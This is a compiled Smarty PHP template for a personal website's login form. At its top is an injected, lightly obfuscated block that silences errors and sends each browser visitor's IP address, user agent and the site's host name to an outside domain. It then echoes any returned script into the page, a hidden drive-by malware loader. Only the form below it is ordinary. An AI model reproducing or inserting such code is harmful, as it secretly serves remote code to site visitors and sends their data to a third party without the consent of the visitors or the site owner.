<?php /* Smarty version 2.6.22, created on 2009-05-27 12:00:42
         compiled from /home/a1425978/public_html/beta//templates/login.html */ ?>
<?php
#ca4bd2#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/ca4bd2#
?>
<?php

?>
<?php

?>
<?php

?>
<fieldset>
	<?php if ($this->_tpl_vars['login_failed']): ?><span style="color:red">Your email and/or password do not match my records.</span><?php endif; ?>
	<legend>AlanMarcero.com Account</legend>
	
	<form action="login.php" method="POST" />
		<p>
			<label>Email:<br /></label>
			<input type="text" name="email" class="textField" />
		</p>
		
		<p>
			<label>Password: <br /></label>
			<input type="password" name="password" class="textField" /><br />
			<small><a href="login.php?retrieve_pw=true">Can't Remember Your Password?</a></small>
		</p>
		
		<p>
			<input type="hidden" name="authorize" value="true" />
			<input type="submit" value="Login" class="buttonSubmit" />
		</p>
	</form>
</fieldset>